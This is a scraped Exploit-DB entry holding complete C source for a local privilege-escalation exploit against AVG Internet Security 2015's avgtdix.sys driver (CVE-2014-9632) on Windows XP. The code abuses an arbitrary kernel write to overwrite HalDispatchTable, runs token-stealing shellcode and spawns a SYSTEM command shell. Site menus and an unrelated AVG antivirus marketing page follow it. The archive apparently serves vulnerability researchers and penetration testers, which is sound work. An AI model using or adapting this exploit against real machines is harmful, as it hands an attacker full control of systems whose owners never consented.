=== Content from www.exploit-db.com_80f91d74_20250125_053238.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# AVG Internet Security 2015.0.5315 - Arbitrary Write Privilege Escalation

#### EDB-ID:

###### 35993

#### CVE:

###### [2014-9632](https://nvd.nist.gov/vuln/detail/CVE-2014-9632)

---

**EDB Verified:**

#### Author:

###### [Parvez Anwar](/?author=6706)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [Windows](/?platform=windows)

#### Date:

###### 2015-02-04

---

**Vulnerable App:**

```
ï»¿/*

Exploit Title    - AVG Internet Security 2015 Arbitrary Write Privilege Escalation
Date             - 04th February 2015
Discovered by    - Parvez Anwar (@parvezghh)
Vendor Homepage  - http://www.avg.com/
Tested Version   - 2015.0.5315
Driver Version   - 15.0.0.5204 - avgtdix.sys
Tested on OS     - 32bit Windows XP SP3
OSVDB            - http://www.osvdb.org/show/osvdb/113824
CVE ID           - CVE-2014-9632
Vendor fix url   - http://www.avg.com/eu-en/avg-release-notes
Fixed Version    - 2015.0.5557
Fixed driver ver - 15.0.0.5553

Note
----
Overwritten HAL dispatch table after exploit

kd> dps nt!HalDispatchTable l c
8054ccb8  00000003
8054ccbc  00340000
8054ccc0  8678d9a0
8054ccc4  0a050002
8054ccc8  6e66744e
8054cccc  001c0707
8054ccd0  00000180
8054ccd4  000001a4
8054ccd8  867d6690
8054ccdc  86706480
8054cce0  00000000
8054cce4  804e42d1 nt!ObpTraceDepth+0x19

10 pointers get overwritten. Since input buffer is in our control and pointers
are static in XP I've triggered the overwrite again restoring the pointers.

*/

#include <stdio.h>
#include <windows.h>

#define BUFSIZE 4096

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
     PVOID   Unknown1;
     PVOID   Unknown2;
     PVOID   Base;
     ULONG   Size;
     ULONG   Flags;
     USHORT  Index;
     USHORT  NameLength;
     USHORT  LoadCount;
     USHORT  PathLength;
     CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
     ULONG   Count;
     SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
     SystemModuleInformation = 11,
     SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
     SYSTEM_INFORMATION_CLASS SystemInformationClass,
     PVOID SystemInformation,
     ULONG SystemInformationLength,
     PULONG ReturnLength);

typedef NTSTATUS (WINAPI *_NtQueryIntervalProfile)(
     DWORD ProfileSource,
     PULONG Interval);

typedef void (*FUNCTPTR)();

// Windows XP SP3

#define XP_KPROCESS 0x44      // Offset to _KPROCESS from a _ETHREAD struct
#define XP_TOKEN    0xc8      // Offset to TOKEN from the _EPROCESS struct
#define XP_UPID     0x84      // Offset to UniqueProcessId FROM the _EPROCESS struct
#define XP_APLINKS  0x88      // Offset to ActiveProcessLinks _EPROCESS struct

BYTE token_steal_xp[] =
{
  0x52,                                                  // push edx                       Save edx on the stack
  0x53,	                                                 // push ebx                       Save ebx on the stack
  0x33,0xc0,                                             // xor eax, eax                   eax = 0
  0x64,0x8b,0x80,0x24,0x01,0x00,0x00,                    // mov eax, fs:[eax+124h]         Retrieve ETHREAD
  0x8b,0x40,XP_KPROCESS,                                 // mov eax, [eax+XP_KPROCESS]     Retrieve _KPROCESS
  0x8b,0xc8,                                             // mov ecx, eax
  0x8b,0x98,XP_TOKEN,0x00,0x00,0x00,                     // mov ebx, [eax+XP_TOKEN]        Retrieves TOKEN
  0x8b,0x80,XP_APLINKS,0x00,0x00,0x00,                   // mov eax, [eax+XP_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
  0x81,0xe8,XP_APLINKS,0x00,0x00,0x00,                   // sub eax, XP_APLINKS         |  Retrieve _EPROCESS Pointer from the ActiveProcessLinks
  0x81,0xb8,XP_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00,  // cmp [eax+XP_UPID], 4        |  Compares UniqueProcessId with 4 (System Process)
  0x75,0xe8,                                             // jne                     ----
  0x8b,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov edx, [eax+XP_TOKEN]        Retrieves TOKEN and stores on EDX
  0x8b,0xc1,                                             // mov eax, ecx                   Retrieves KPROCESS stored on ECX
  0x89,0x90,XP_TOKEN,0x00,0x00,0x00,                     // mov [eax+XP_TOKEN], edx        Overwrites the TOKEN for the current KPROCESS
  0x5b,                                                  // pop ebx                        Restores ebx
  0x5a,                                                  // pop edx                        Restores edx
  0xc2,0x08                                              // ret 8                          Away from the kernel
};

BYTE restore_pointers_xp[] =  // kd> dps nt!HalDispatchTable
"\xf2\xa3\x6f\x80"            // 8054ccbc  806fa3f2 hal!HaliQuerySystemInformation
"\xce\xa3\x6f\x80"            // 8054ccc0  806fa3ce hal!HaliSetSystemInformation
"\x0b\x46\x61\x80"            // 8054ccc4  8061460b nt!xHalQueryBusSlots
"\x00\x00\x00\x00"            // 8054ccc8  00000000
"\x4d\xac\x50\x80"            // 8054cccc  8050ac4d nt!HalExamineMBR
"\x89\x6f\x5c\x80"            // 8054ccd0  805c6f89 nt!IoAssignDriveLetters
"\xe5\x4a\x5c\x80"            // 8054ccd4  805c4ae5 nt!IoReadPartitionTable
"\x7b\x3f\x61\x80"            // 8054ccd8  80613f7b nt!IoSetPartitionInformation
"\xef\x41\x61\x80"            // 8054ccdc  806141ef nt!IoWritePartitionTable
"\x57\xd1\x52\x80";           // 8054cce0  8052d157 nt!CcHasInactiveViews

DWORD HalDispatchTableAddress()
{
    _NtQuerySystemInformation    NtQuerySystemInformation;
    PSYSTEM_MODULE_INFORMATION   pModuleInfo;
    DWORD                        HalDispatchTable;
    CHAR                         kFullName[256];
    PVOID                        kBase = NULL;
    LPSTR                        kName;
    HMODULE                      Kernel;
    FUNCTPTR                     Hal;
    ULONG                        len;
    NTSTATUS                     status;

    NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQuerySystemInformation)
    {
        printf("[-] Unable to resolve NtQuerySystemInformation\n\n");
        return -1;
    }

    status = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    if (!status)
    {
        printf("[-] An error occured while reading NtQuerySystemInformation. Status = 0x%08x\n\n", status);
        return -1;
    }

    pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);

    if(pModuleInfo == NULL)
    {
        printf("[-] An error occurred with GlobalAlloc for pModuleInfo\n\n");
        return -1;
    }

    status = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);

    memset(kFullName, 0x00, sizeof(kFullName));
    strcpy_s(kFullName, sizeof(kFullName)-1, pModuleInfo->Module[0].ImageName);
    kBase = pModuleInfo->Module[0].Base;

    printf("[i] Kernel base name %s\n", kFullName);
    kName = strrchr(kFullName, '\\');

    Kernel = LoadLibraryA(++kName);

    if(Kernel == NULL)
    {
        printf("[-] Failed to load kernel base\n\n");
        return -1;
    }

    Hal = (FUNCTPTR)GetProcAddress(Kernel, "HalDispatchTable");

    if(Hal == NULL)
    {
        printf("[-] Failed to find HalDispatchTable\n\n");
        return -1;
    }

    printf("[i] HalDispatchTable address 0x%08x\n", Hal);
    printf("[i] Kernel handle 0x%08x\n", Kernel);
    printf("[i] Kernel base address 0x%08x\n", kBase);

    HalDispatchTable = ((DWORD)Hal - (DWORD)Kernel + (DWORD)kBase);

    printf("[+] Kernel address of HalDispatchTable 0x%08x\n", HalDispatchTable);

    if(!HalDispatchTable)
    {
        printf("[-] Failed to calculate HalDispatchTable\n\n");
        return -1;
    }

    return HalDispatchTable;
}

int GetWindowsVersion()
{
    int v = 0;
    DWORD version = 0, minVersion = 0, majVersion = 0;

    version = GetVersion();

    minVersion = (DWORD)(HIBYTE(LOWORD(version)));
    majVersion = (DWORD)(LOBYTE(LOWORD(version)));

    if (minVersion == 1 && majVersion == 5) v = 1;  // "Windows XP;
    if (minVersion == 1 && majVersion == 6) v = 2;  // "Windows 7";
    if (minVersion == 2 && majVersion == 5) v = 3;  // "Windows Server 2003;

    return v;
}

void spawnShell()
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOWNORMAL;

    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    {
        printf("\n[-] CreateProcess failed (%d)\n\n", GetLastError());
        return;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int main(int argc, char *argv[])
{

    _NtQueryIntervalProfile     NtQueryIntervalProfile;
    LPVOID                      input[1] = {0};
    LPVOID                      addrtoshell;
    HANDLE                      hDevice;
    DWORD                       dwRetBytes = 0;
    DWORD                       HalDispatchTableTarget;
    ULONG                       time = 0;
    unsigned char               devhandle[MAX_PATH];

    printf("-------------------------------------------------------------------------------\n");
    printf("     AVG Internet Security 2015 (avgtdix.sys) Arbitrary Write EoP Exploit      \n");
    printf("                         Tested on Windows XP SP3 (32bit)                      \n");
    printf("-------------------------------------------------------------------------------\n\n");

    if (GetWindowsVersion() == 1)
    {
        printf("[i] Running Windows XP\n");
    }

    if (GetWindowsVersion() == 0)
    {
        printf("[i] Exploit not supported on this OS\n\n");
        return -1;
    }

    sprintf(devhandle, "\\\\.\\%s", "avgtdi");

    NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");

    if (!NtQueryIntervalProfile)
    {
        printf("[-] Unable to resolve NtQueryIntervalProfile\n\n");
        return -1;
    }

    addrtoshell = VirtualAlloc(NULL, BUFSIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if(addrtoshell == NULL)
    {
        printf("[-] VirtualAlloc allocation failure %.8x\n\n", GetLastError());
        return -1;
    }
    printf("[+] VirtualAlloc allocated memory at 0x%.8x\n", addrtoshell);

    memset(addrtoshell, 0x90, BUFSIZE);
    memcpy(addrtoshell, token_steal_xp, sizeof(token_steal_xp));
    printf("[i] Size of shellcode %d bytes\n", sizeof(token_steal_xp));

    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFile open %s device failed (%d)\n\n", devhandle, GetLastError());
        return -1;
    }
    else
    {
        printf("[+] Open %s device successful\n", devhandle);
    }

    HalDispatchTableTarget = HalDispatchTableAddress() + sizeof(DWORD);
    printf("[+] HalDispatchTable+4 (0x%08x) will be overwritten\n", HalDispatchTableTarget);

    input[0] = addrtoshell;  // input buffer contents gets written to our output buffer address

    printf("[+] Input buffer contents %08x\n", input[0]);

    printf("[~] Press any key to send Exploit  . . .\n");
    getch();

    DeviceIoControl(hDevice, 0x830020f8, input, sizeof(input), (LPVOID)HalDispatchTableTarget, 0, &dwRetBytes, NULL);

    printf("[+] Buffer sent\n");

    printf("[+] Spawning SYSTEM Shell\n");
    NtQueryIntervalProfile(2, &time);
    spawnShell();

    printf("[+] Restoring Hal dispatch table pointers\n\n");

    DeviceIoControl(hDevice, 0x830020f8, restore_pointers_xp, sizeof(restore_pointers_xp)-1, (LPVOID)HalDispatchTableTarget, 0, &dwRetBytes, NULL);

    CloseHandle(hDevice);

    return 0;
}

```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

Â©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

Ã

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as âGoogle Hackingâ was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnnyâs talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term âGoogledorkâ to refer
to âa foolish or inept person as revealed by Googleâ. This was meant to draw attention to
the fact that this was not a âGoogle problemâ but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term âdorkâ became shorthand for a search query that located sensitive
information and âdorksâ were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

Ã

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

Ã

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.avg.com_749fad29_20250125_053237.html ===


[Log in to AVG MyAccount](https://account.avg.com/?migration&utm_campaign=myaccount_web_menu)
[Blog](https://www.avg.com/en/signal)
![](https://static2.avg.com/10004117/web/i/avg/img/components/languageselector/arrow-down.svg)

![menu](https://static2.avg.com/10004117/web/i/components/menu-mobile.svg)

[![AVG logo](https://static2.avg.com/10004117/web/i/other/avg-logo-v2.png)](/en-eu/homepage)

[Skip to content](#body-inner)

* xml version="1.0" encoding="UTF-8"?
  Close-icon
* [PC](/en-eu/store#pc)
  + PC
    xml version="1.0" encoding="UTF-8"?
    Close-icon
  + The Best
  + [AVG Ultimate](/en-eu/ultimate)
  + Protection
  + [AVG AntiVirus FREE](/en-eu/free-antivirus-download)
  + [AVG Internet Security](/en-eu/internet-security)
  + Performance
  + [AVG TuneUp](/en-eu/avg-pctuneup)
  + [AVG Driver Updater](/en-eu/avg-driver-updater)
  + Privacy
  + [AVG Secure VPN for PC](/en-eu/secure-vpn)
  + [AVG AntiTrack](/en-eu/antitrack)
  + [AVG Secure Browser](/en-eu/secure-browser)
  + [AVG BreachGuard](/en-eu/breachguard)
  + [All PC Products](/en-eu/store#pc)
* [Mac](/en-eu/store#mac)
  + Mac
    xml version="1.0" encoding="UTF-8"?
    Close-icon
  + The Best
  + [AVG Ultimate](/en-eu/ultimate)
  + Protection
  + [AVG AntiVirus FREE for Mac](/en-eu/avg-antivirus-for-mac)
  + [AVG Internet Security for Mac](/en-eu/internet-security-for-mac)
  + Performance
  + [AVG TuneUp for Mac](/en-eu/avg-tuneup-for-mac)
  + Privacy
  + [AVG Secure VPN for Mac](/en-eu/download-secure-vpn-mac)
  + [AVG AntiTrack for Mac](/en-eu/antitrack#mac)
  + [AVG Secure Browser for Mac](/en-eu/secure-browser#mac)
  + [AVG BreachGuard for Mac](/en-eu/breachguard#mac)
  + [All Mac products](/en-eu/store#mac)
* [Mobile](/en-eu/store#mobile)
  + Mobile
    xml version="1.0" encoding="UTF-8"?
    Close-icon
  + [AVG AntiVirus for Android](/en-eu/antivirus-for-android)
  + [AVG Cleaner for Android](/en-eu/avg-memory-cleaner)
  + [AVG Secure VPN for Android](/en-eu/download-secure-vpn-android)
  + [AVG Secure Browser for Android](/en-eu/secure-browser#android)
  + [AVG Mobile Security for iPhone/iPad](/en-eu/mobile-security-for-iphone-ipad)
  + [AVG Secure VPN for iPhone/iPad](/en-eu/download-secure-vpn-ios)
  + [All Mobile Products](/en-eu/store#mobile)
* [Store](/en-eu/store)
* [Partners](/en-eu/partners)
* [Services](/en-eu/avg-go-tech-support)
  + Services
    xml version="1.0" encoding="UTF-8"?
    Close-icon
  + [Premium Tech Support](/en-eu/avg-go-tech-support)
  + [Express Install](/en-eu/express-installation)
* [Support](https://support.avg.com/)
  + Support
    xml version="1.0" encoding="UTF-8"?
    Close-icon
  + Home products
  + [Home Support](https://support.avg.com/?l=en)
  + [Premium Tech Support](/en-eu/avg-go-tech-support)
  + [Installation Files](/en-eu/installation-files)
  + Partner Products
  + [Partner Support & Contact](https://support.avg.com/partners?l=en)

[Log in to AVG MyAccount](https://myaccount.avg.com/my-account-login)
[Blog](https://www.avg.com/en/signal)
English
![](https://static2.avg.com/10004117/web/i/avg/img/components/languageselector/arrow-down.svg)

![](https://static2.avg.com/10004117/web/i/avg/antivirus-free-v2.svg)

![2024<br><strong>Top Rated product</strong>](https://static2.avg.com/10004117/web/i/awards/2024/avcomparatives_award_2023_top_rated_avast_avg.png)
2024
**Top Rated product**
Get award-winning protection

[Free download](/en-eu/download-thank-you.php?product=FREEGSR-FAD)

![Download AVG AntiVirus Free](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/free-antivirus-icon--bottom-section.svg)
AVG Antivirus Free

# Defend your PC against cyberthreats with our award-winning, free antivirus

Download AVG AntiVirus Free for real-time protection against viruses, infected emails, scam websites, and more.

![](https://static2.avg.com/10004117/web/i/awards/2023/av-test--best-protection-2023.png)

January 2024
**Best Protection**

![](https://static2.avg.com/10004117/web/i/awards/2023/av-comparatives--top-product-2023.png)

January 2024
**Top Rated product**

[Trustpilot](https://www.trustpilot.com/review/www.avg.com)

[Free download](/en-eu/download-thank-you.php?product=FREEGSR-FAD&variant=1606)

Also available for [Mac](/en-eu/avg-antivirus-for-mac), [Android](/en-eu/antivirus-for-android), and [iOS](/en-eu/mobile-security-for-iphone-ipad)

Millions of people chose AVG AntiVirus Free to get:

![6 Layers of <span>security</span>](https://static2.avg.com/10004117/web/i/page/free-antivirus-download-t1/top-awards/80/6-layers.svg)
6 Layers of security

![30+ years of <span>expertise</span>](https://static2.avg.com/10004117/web/i/page/free-antivirus-download-t1/top-awards/80/avg.svg)
30+ years of expertise

![Advanced scam protection ](https://static2.avg.com/10004117/web/i/page/free-antivirus-download-t1/top-awards/80/target.svg)
Advanced scam protection

![8 tools and <span>features</span>](https://static2.avg.com/10004117/web/i/page/free-antivirus-download-t1/top-awards/80/devices.svg)
8 tools and features

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/media--section-antivirus.png)

![icon windows](https://static2.avg.com/10004117/web/i/ico/platform-icons/32/black/platform-ico-windows.svg)
![icon mac](https://static2.avg.com/10004117/web/i/ico/platform-icons/32/black/platform-ico-mac.svg)
![icon android](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/icon-android-v2.svg)
![icon ios](https://static2.avg.com/10004117/web/i/ico/platform-icons/32/black/platform-ico-ios.svg)
## Staying safer from online scams and malware couldnât be easier

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/media--section-antivirus.png)

Weâve built our free antivirus software tools and features to be simple and easy-to-use. Save time and effort boosting the security of your digital world with our free computer virus protection.

[Free download](/en-eu/download-thank-you.php?product=FREEGSR-FAD&variant=1606)

![Boost your defense against cyberthreats](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-threat.svg)
Boost your defense against cyberthreats

Forget viruses and spyware. We help stop them with multi-layered protection.

![Do more to block malware-infected emails](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-email-attention.svg)
Do more to block malware-infected emails

Be alerted to infected emails or attachments before you click on them.

![Keep your PC safer from potential hackers](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-malicious.svg)
Keep your PC safer from potential hackers

Help stop [hackers](https://www.avg.com/en/signal/have-i-been-hacked) from accessing your PCâs and home network.

![Reduce your risk exposure to online fraudsters](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-phishing.svg)
Reduce your risk exposure to online fraudsters

Avoid [scam web pages](https://www.avg.com/en/signal/website-safety) and infected links associated with malware and [phishing](https://www.avg.com/en/signal/what-is-phishing).

## Experts trust us, so can you

See what tech journalists say about AVG AntiVirus Free.

![Techradar](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/testimonial-1-logo.svg)
![quote](https://static2.avg.com/10004117/web/i/ico/icon-quote.svg)

This antivirus suite has one of the cleanest user interfaces on the market today and remains an excellent choice for advanced users who wish to fully customize their threat monitoring system.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/stars-box-1.svg)

![Safewise](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/testimonial-2-logo.svg)
![quote](https://static2.avg.com/10004117/web/i/ico/icon-quote.svg)

AVG AntiVirus Free performs well in independent testing, and PC users are very happy with it. If you're looking for a simple way to beef up the security on your PC, the AVG AntiVirus Free is a great choice. If you want to protect all of your devices from malicious software, no matter who is using them, then AVG Internet Security can give you added peace of mind.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/stars-box.svg)

![Cybernews](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/testimonial-3-logo.svg)
![quote](https://static2.avg.com/10004117/web/i/ico/icon-quote.svg)

In lab tests, AVG AntiVirus detected 100% of all viruses it had prior knowledge of, and 99% of all viruses it had no prior knowledge of (i.e. âzero-dayâ attacks by new viruses), AVG AntiVirus offers impressive protection for free software. Add to that the user-friendly interface and excellent support, and this product is a no-brainer for Mac, PC, and Android users.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/stars-box.svg)

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/media-6-layers-of-antivirus-protection.svg)

## Relax, youâre protected with multi-layered security

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/media-6-layers-of-antivirus-protection.svg)

More is better when it comes to security. Use our antivirus software for PCs to help scan for cyberthreats and block suspicious files or activity in real time. This includes online scams. Plus, isolate digital threats from your operating system to keep it safer.

See the six ways we help you below.

[Free download](/en-eu/download-thank-you.php?product=FREEGSR-FAD&variant=1606)

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-smart-scan--brain-capture.svg)
Find and fix potential security issues
Automatically scan your device for potential [cybersecurity weaknesses](https://www.avg.com/en/signal/computer-security-exploits). Get help resolving unsafe settings and passwords, plus vulnerable out-of-date software.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-cybercapture.svg)
Block risky or dangerous files
Do more to counter suspicious files by automatically sending them to us for analysis. We help block unsafe files from your system to keep you and your device more secure.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-warning.svg)
Stop unsafe or strange app activity
Get alerts if your apps show signs of unusual activity. Plus, help stop suspected digital threats before they can cause damage to your operating system.

![](https://static2.avg.com/10004117/web/i/page/free-antivirus-download/ico-file-shield--folder.svg)
Check opened or added files for threats
Get support dealing with malware that may be hidden in recently added or opened files. Help resolve the cyberthreat, quarantine it, or delete the problematic file altogether.

